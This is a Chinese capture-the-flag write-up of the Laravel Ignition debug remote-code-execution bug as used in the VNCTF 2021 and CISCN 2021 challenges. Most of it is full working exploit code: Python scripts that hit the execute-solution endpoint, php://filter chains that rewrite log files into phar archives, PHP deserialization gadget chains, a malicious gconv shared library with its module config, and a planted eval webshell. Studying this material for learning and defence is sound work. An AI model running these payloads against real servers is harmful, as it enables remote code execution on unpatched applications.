> 原文链接: https://www.anquanke.com//post/id/243076 


# VNCTF2021 EZ_laravel&amp;&amp;CISCN2021 filter  WP


                                阅读量   
                                **86065**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01a56a659f96f08fe0.jpg)](https://p4.ssl.qhimg.com/t01a56a659f96f08fe0.jpg)



## 写在前面

这两个题目的口子一样，完全可以参照 `laravel 8 debug rce` 的漏洞，里面值得细讲的就是转换器，和不同框架的日志文件，先分析漏洞吧，框架有很多，日志也不相同，希望同样的漏洞发生在不同框架时，可以通过分析日志来变通。



## 环境准备

环境是在 win下面的。

```
composer create-project laravel/laravel="8.0.*" laravel8.0 --prefer-dist
cd laravel8.0
composer require facade/ignition==2.5.1
php artisan serve
```



## 漏洞分析

由于我们是直接创建了一个项目所以，没有出现`Ignition`（Laravel 6+默认错误页面生成器），这个错误页面生成器会提供一个`solutions`。在 这个控制器中有入口。

```
src/Http/Controllers/ExecuteSolutionController.php
```

[![](https://p3.ssl.qhimg.com/t014a9b8b59d96e8e12.png)](https://p3.ssl.qhimg.com/t014a9b8b59d96e8e12.png)

[![](https://p3.ssl.qhimg.com/t0108e1ade5f84b90dc.png)](https://p3.ssl.qhimg.com/t0108e1ade5f84b90dc.png)

`solution` 可控 那就可以调用任意 `solution` 的`run`方法。且参数可控。

利用点在`src/Solutions/MakeViewVariableOptionalSolution.php`

[![](https://p5.ssl.qhimg.com/t01cd9bac431d37eda9.png)](https://p5.ssl.qhimg.com/t01cd9bac431d37eda9.png)

`viewFile` 可控，可以或许可以任意写， `$output` 是否可控呢？打个断点，看是否污染吧。构造如下数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0185b27e2baaa3972d.png)

[![](https://p3.ssl.qhimg.com/t01a4e6b25b4212f7ba.png)](https://p3.ssl.qhimg.com/t01a4e6b25b4212f7ba.png)

如果我们传入了`variableName`，`$output` 是不会改变的。

那么代码简化

```
$output=file_get_contents($parameters['viewFile']);
file_put_contents($parameters['viewFile'], $output);
```

写入的文件 和 文件内容是没办法齐美的。写入木马自然不可以。



## 漏洞利用

原作者的思路，是尝试往日志文件中写入 `phar` 文件，然后在 `file_get_contents` 处触发 反序列化。

我们可以利用 `php://filter/write=`过滤器 来获取日志文件的内容，然后在写入过滤后的内容来，写入完整的 phar文件。

### <a class="reference-link" name="%E9%A6%96%E5%85%88%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97%E3%80%82"></a>首先清除日志。

```
php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

参考链接已经解释很详细了，就不造次了。

### <a class="reference-link" name="%E5%86%99%E5%85%A5%20payload"></a>写入 payload

```
=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00
```

可以先观察日志文件，日志只记录了报错信息。

```
[2021-05-19 07:54:58] local.ERROR: file_get_contents(=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00): failed to open stream: No such file or directory `{`"exception":"[object] (ErrorException(code: 0): file_get_contents(=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00): failed to open stream: No such file or directory at D:\\ctf\\phpstudy\\phpstudy_pro\\WWW\\sources\\laravel\\laravel8.0\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)
[stacktrace]
……
```

可以发现 我们的`payload (xxxxx)` 出现了两次。

重点讲一下 写入phar 文件时清空干扰词遇见的的问题。

```
php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

`quoted-printable-decode`会把我们的payload解码，

然后在再 `utf-16le-&gt;utf-8`

`utf-16le` 是两个字节编码的，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f18722b2e15c2d38.png)

可以看一下，其实 相当于 就是 将 `1234 =&gt; 1\02\03\04\0`

我们写入的`payload`也是这种形式的，我们希望在 `utf-16le -&gt; utf-8` 的时候我们的`payload`可以得到正确的解码

那么就需要 payload 前面的字符数量是 偶数个。

[![](https://p2.ssl.qhimg.com/t0105d0c54a2199cf5d.png)](https://p2.ssl.qhimg.com/t0105d0c54a2199cf5d.png)

喔？奇数个？我们是有两个`payload`在日志文件中的，这两个payload中间也是奇数个的。

[![](https://p4.ssl.qhimg.com/t01621643ed1bee17d3.png)](https://p4.ssl.qhimg.com/t01621643ed1bee17d3.png)

而日志文件是奇数个的。

[![](https://p1.ssl.qhimg.com/t0189957aa40473476a.png)](https://p1.ssl.qhimg.com/t0189957aa40473476a.png)

|xxxx|payload|xxxx|payload|xxxx
|------
|奇数|偶数|奇数|偶数|奇数

这样的话我们可以尝试复写一个前缀进去，

|xxxx|AA|xxxx|AA|xxxx
|------
|奇数|偶数|奇数|偶数|奇数

|xxxx|payload|xxxx|payload|xxxx
|------
|奇数|偶数|奇数|偶数|奇数

这样的话，我们处于前面位置的`payload` 就会在转码后 完整保留下来。当我把`payload` 换成phar 的链子的时候，出现了错误，我看有的师傅会在 `payload` 后面再加一个 A，问题是解决了。可能日志的问题吧。但加前缀在一定程度上一定没问题的。

如果在写入phar文件的时候出现了问题，不妨再在`payload`后加一个 A 后缀吧。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012854d226c8729d3e.png)

[![](https://p1.ssl.qhimg.com/t01923384d8916e75ce.png)](https://p1.ssl.qhimg.com/t01923384d8916e75ce.png)

贴个自己写的exp吧。

```
import requests
import json


url = "http://127.0.0.1:8000/_ignition/execute-solution"
#清空
file1='php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'

#payload
s='PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpgAQAAAgAAABEAAAABAAAAAAAJAQAATzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6Mzp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6OToiACoAYnVmZmVyIjthOjE6e3M6NDoidGVzdCI7YToyOntpOjA7czo0OiJjYWxjIjtzOjU6ImxldmVsIjtOO319czoxMDoiACoAaGFuZGxlciI7TzoyODoiTW9ub2xvZ1xIYW5kbGVyXEdyb3VwSGFuZGxlciI6MTp7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQUAAABkdW1teQQAAABT2KRgBAAAAAx+f9ikAQAAAAAAAAgAAAB0ZXN0LnR4dAQAAABT2KRgBAAAAAx+f9ikAQAAAAAAAHRlc3R0ZXN07IzUmEt8iAPk56fX9y7EGC+LREcCAAAAR0JNQg=='
file2=''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()+'A'

# 清楚干扰字
file3='php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'

file4='phar://../storage/logs/laravel.log'

def getpayload(file):
  payload = json.dumps(`{`
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": `{`
    "variableName": "username",
    "viewFile": file
    `}`
  `}`)
  return payload

headers = `{`
  'Content-Type': 'application/json'
`}`



def write():
  res=requests.request("POST", url, headers=headers, data=getpayload(file1))
  if 'ErrorException' in res.text:
    requests.request("POST", url, headers=headers, data=getpayload(file1))
  requests.request("POST", url, headers=headers, data=getpayload('AA'))
  requests.request("POST", url, headers=headers, data=getpayload(file2))
  res=requests.request("POST", url, headers=headers, data=getpayload(file3))
  if 'ErrorException' in res.text:
    print('写入失败，重来喽')

write()
```

当然这个漏洞还可以利用 `file_put_contents` 通过 `ftp` 被动模式 打`ssrf`。



## 题目

### <a class="reference-link" name="%5BVNCTF%202021%5DEasy_laravel"></a>[VNCTF 2021]Easy_laravel

给了源码，phar文件写入日志的漏洞还在，但是要重新找一个链子。

找 `__destruct`

`Importconfigurator` 类中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c9e2e8955922c6c8.png)

找 `__call()`

`HigherOrderMessage`类中

[![](https://p4.ssl.qhimg.com/t01f23e6fd9bc1c2bcb.png)](https://p4.ssl.qhimg.com/t01f23e6fd9bc1c2bcb.png)

这里可以实例化任意类，并调用其任意方法。

找存在危险函数的方法。

`Mockclass` 类

[![](https://p4.ssl.qhimg.com/t018388d4629a5fdfb8.png)](https://p4.ssl.qhimg.com/t018388d4629a5fdfb8.png)

这里可以执行任意代码。

```
&lt;?php
namespace Symfony\Component\Routing\Loader\Configurator`{`
    class ImportConfigurator`{`
        private $parent;
        private $route;
        public function __construct($class)`{`
            $this-&gt;parent = $class;
            $this-&gt;route = 'test';
        `}`
    `}`
`}`

namespace Mockery`{`
    class HigherOrderMessage`{`
        private $mock;
        private $method;
        public function __construct($class)`{`
            $this-&gt;mock = $class;
            $this-&gt;method = 'generate';
        `}`
    `}`
`}`

namespace PHPUnit\Framework\MockObject`{`
    final class MockTrait`{`
        private $classCode;
        private $mockName;
        public function __construct()`{`
            $this-&gt;classCode = "phpinfo();";
            $this-&gt;mockName  = 'jiang';
        `}`
    `}`
`}`

namespace`{`
    use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
    use \Mockery\HigherOrderMessage;
    use \PHPUnit\Framework\MockObject\MockTrait;

    $m = new MockTrait();
    $h = new HigherOrderMessage($m);
    $i = new ImportConfigurator($h);

    $phar = new Phar("phar.phar");
    $phar -&gt; startBuffering();
    $phar -&gt; addFromString("test.txt","test");
    $phar -&gt; setStub("GIF89a"."&lt;?php __HALT_COMPILER();?&gt;");
    $phar -&gt; setMetadata($i);
    $phar -&gt; stopBuffering();
    echo base64_encode(file_get_contents('phar.phar'));
`}`
?&gt;
```

将payload 带进上面的 exp，打不通？这就是 在后面加’A’的问题了，去掉就可以了。

[![](https://p4.ssl.qhimg.com/t01572b36602613b8b3.png)](https://p4.ssl.qhimg.com/t01572b36602613b8b3.png)

ban了 `iconv` 和`iconv_strlen`。 有猫腻哈哈。留了 `putenv`，但还ban了 `mail` 应该就是利用 `php://filter` 中的 `iconv`转换器来加载恶意so 了，还开了 `open_basedir`

[![](https://p0.ssl.qhimg.com/t01c537562c9a3971a3.png)](https://p0.ssl.qhimg.com/t01c537562c9a3971a3.png)

漏洞原型如下

[https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80](https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80)

先写一个可持续利用log 吧，不然每次都要重新打，很烦。

`jiang.phar` 内容是一个 `eval($_GET[cmd])`的木马

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017cc6ebc647e8cc31.png)

用`glob` 和 `ini_set`都没绕过 这`open_basedir`，很奇怪。

guoke师傅的wp里说 有 `/readflag`，

在传入 `.so` 文件和 `module`文件的时候，不能从远程`vps` 上下载，只能分段传输了，切记 分段传输的时候 文件的完整性，如果最后没打通，来检查检查 `.so`文件是否完整。

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void gconv() `{``}`
void gconv_init() `{`
  system("/readflag &gt; /tmp/flag");
  exit(0);
`}`
gcc payload.c -o payload.so -shared -fPIC
```

```
gconv-modules
module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2
```

在exp 中加入这个函数，跑就好了，上面的 `write`函数可以不用执行了，记得修改`phar://`。

```
def read():
  parm="?cmd=print_r(scandir('/tmp'));putenv('GCONV_PATH=/tmp/');file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/jiang','jiang');"
  res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
  while 'flag' not in res.text:
    res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
    print('continue')

  parm="?cmd=echo file_get_contents('/tmp/flag');"
  res=requests.request("POST", url=url+parm, headers=headers, data=getpayload(file4))
  print(res.text.split('&lt;/html&gt;')[1])
read()
```

这里比较玄学，因为在转换器触发.so 文件的时候，并不一定会成功，第一次做的时候 十几次，写wp再做的时候 跑了上百次，多发几次。（ fuck 我加的

[![](https://p3.ssl.qhimg.com/t01f10b0d5b1bd331ea.png)](https://p3.ssl.qhimg.com/t01f10b0d5b1bd331ea.png)

### <a class="reference-link" name="CISCN%20filter"></a>CISCN filter

题目就给了个 `composer.json`文件 和 控制器，hint是 log的配置

[![](https://p4.ssl.qhimg.com/t01d1e5cdaa09b56d16.png)](https://p4.ssl.qhimg.com/t01d1e5cdaa09b56d16.png)

[![](https://p5.ssl.qhimg.com/t01fbd8ad880d9838e5.png)](https://p5.ssl.qhimg.com/t01fbd8ad880d9838e5.png)

log可以写进本地配置自己打的，在`config/web.config` 里

[![](https://p5.ssl.qhimg.com/t011eed723a65e83e4b.png)](https://p5.ssl.qhimg.com/t011eed723a65e83e4b.png)

同样是把报错内容写进 日志里。

不一样的是，日志的 `payload(xxxxxxx)` 只出现了一次，

我们 编码后的`payload` 一定是偶数，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010b83dfaac9b98871.png)

前偶后偶，不用加前缀了，直接打`payload`就可以了诶。

本地环境可能有些问题，牛头不对马嘴了

[![](https://p0.ssl.qhimg.com/t015833d583fe69a4dc.png)](https://p0.ssl.qhimg.com/t015833d583fe69a4dc.png)

这两个日志不同的 是 ??? 没了。

[![](https://p2.ssl.qhimg.com/t0121c46631bdf29479.png)](https://p2.ssl.qhimg.com/t0121c46631bdf29479.png)

长度还变成了 奇数个。

不过不影响，因为我们 payload前面是不变的偶数，影响的只有后面，只有保证后面是偶数个，在 `utf-16le-&gt;utf-8` 的时候不报错就OK。

加一个 A 就行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f8ac7fa69ea543f0.png)

这道题的坑在

[![](https://p1.ssl.qhimg.com/t01a42f733d5847250e.png)](https://p1.ssl.qhimg.com/t01a42f733d5847250e.png)

这里，

[![](https://p2.ssl.qhimg.com/t01fa3869c103dc242d.png)](https://p2.ssl.qhimg.com/t01fa3869c103dc242d.png)

yii这个版本没可用的链子。

需要用 `monolog`组件的链子打

[![](https://p2.ssl.qhimg.com/t0177ab883ee40b7b73.png)](https://p2.ssl.qhimg.com/t0177ab883ee40b7b73.png)

exp如下

```
import requests
import os


s='PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq+AgAAAgAAABEAAAABAAAAAABnAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6Njoic29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo0OiJjYWxjIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NDoiY2FsYyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX19BQAAAGR1bW15BAAAAHsMpWAEAAAADH5/2KQBAAAAAAAACAAAAHRlc3QudHh0BAAAAHsMpWAEAAAADH5/2KQBAAAAAAAAdGVzdHRlc3SLzw7MRTDv+IZ+8iRcMtNeQdjWsQIAAABHQk1C'
payload=''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()


url = "http://localhost:8080/?file="

proxies = `{`
  "http": None,
  "https": None,
`}`
# 清空
file1='php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log'

#payload
file2=payload

# 清楚干扰字
file3='php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log'

file4='phar://../runtime/logs/app.log'

def write():

  res = requests.get(url=url+file1,proxies=proxies)
  while 'Congratulations!' not in res.text:
    res = requests.get(url=url+file1,proxies=proxies)

  #题目环境可能 payload前面偶数后奇数，所以后面再加以个 A （payload永远偶数）
  #requests.get(url=url+'AA',proxies=proxies) #题目环境的日志可能不一样，如果加上A 出错，不加A 出不来，就把这个注释去掉
  requests.get(url=url+file2+'A',proxies=proxies) # 本地如果加了A 出错，就把A去掉，

  res = requests.get(url=url+file3,proxies=proxies)
  if 'Congratulations!' not in res.text:
    print('重来！！')
  else:
    print('写入成功')
    read()

def read():
  res=requests.get(url=url+file4,proxies=proxies)

  print(res.text)

write()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015f19ebadc4064e14.gif)

这是弹计算器的，buu上复现的话，记得换`payload`。

每个人的目录结构不同，日志也会不一样，原理大抵如此，如果有遇到什么问题还请告知，还有爱春秋春季赛TP5.1.41的类似问题，也方便解答。

参考

[https://www.ambionics.io/blog/laravel-debug-rce](https://www.ambionics.io/blog/laravel-debug-rce)

[https://xz.aliyun.com/t/9030](https://xz.aliyun.com/t/9030)
